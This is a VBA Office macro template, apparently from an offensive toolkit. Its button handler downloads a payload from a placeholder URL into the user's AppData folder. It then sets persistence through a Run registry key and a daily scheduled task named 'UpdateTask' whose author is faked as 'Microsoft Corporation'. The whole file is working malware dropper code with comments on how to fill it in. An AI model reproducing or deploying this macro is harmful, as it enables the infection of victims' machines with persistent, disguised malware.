#If VBA7 And Win64 Then
    Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
      Alias "URLDownloadToFileA" ( _
        ByVal pCaller As LongPtr, _
        ByVal szURL As String, _
        ByVal szFileName As String, _
        ByVal dwReserved As LongPtr, _
        ByVal lpfnCB As LongPtr _
      ) As Long
    Private Declare PtrSafe Function DeleteUrlCacheEntry Lib "Wininet.dll" _
      Alias "DeleteUrlCacheEntryA" ( _
        ByVal lpszUrlName As String _
      ) As Long
#Else
    Private Declare Function URLDownloadToFile Lib "urlmon" _
      Alias "URLDownloadToFileA" ( _
        ByVal pCaller As Long, _
        ByVal szURL As String, _
        ByVal szFileName As String, _
        ByVal dwReserved As Long, _
        ByVal lpfnCB As Long _
      ) As Long
    Private Declare Function DeleteUrlCacheEntry Lib "Wininet.dll" _
      Alias "DeleteUrlCacheEntryA" ( _
        ByVal lpszUrlName As String _
      ) As Long
#End If

Private Sub CommandButton1_Click()

    Dim InpUrl As String
    Dim OutFilePath As String
    Dim DownloadStatus As Long
    
    InpUrl = "<payload serving URL>"
    OutFilePath = Environ("LocalAppData") & "\Microsoft\Windows\<payload.ext>" 'payload will be saved in C:\Users\<username>\AppData\Local\Microsoft\Windows
    DownloadStatus = URLDownloadToFile(0, InpUrl, OutFilePath, 0, 0)


'persistence using registry
  
   Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
   objRegistry.SetStringValue &H80000001, "Software\Microsoft\Windows\CurrentVersion\Run", "<registry key name>", Environ("LocalAppData") & "\Microsoft\Windows\payload.ext"


'persistence using task scheduler, the task will be executed everyday at the time when the macro is first executed

   Set service = CreateObject("Schedule.Service")
   Call service.Connect
   Dim td: Set td = service.NewTask(0)
   td.RegistrationInfo.Author = "Microsoft Corporation"
   td.settings.StartWhenAvailable = True
   td.settings.Hidden = False
   Dim triggers: Set triggers = td.triggers
   Dim trigger: Set trigger = triggers.Create(2)
   Dim startTime: ts = DateAdd("s", 30, Now)
   startTime = Year(ts) & "-" & Right(Month(ts), 2) & "-" & Right(Day(ts), 2) & "T" & Right(Hour(ts), 2) & ":" & Right(Minute(ts), 2) & ":" & Right(Second(ts), 2)
   trigger.StartBoundary = startTime
   trigger.ID = "TimeTriggerId"
   Dim Action: Set Action = td.Actions.Create(0)
   Action.Path = "<path to payload.ext>" 'in case of the payload path being used as above in line 37, follow the same format
   Action.Arguments = "if payload.ext requires any arguments, add here, otherwise delete/comment out this line"
   Call service.GetFolder("\").RegisterTaskDefinition("UpdateTask", td, 6, , , 3)


End Sub
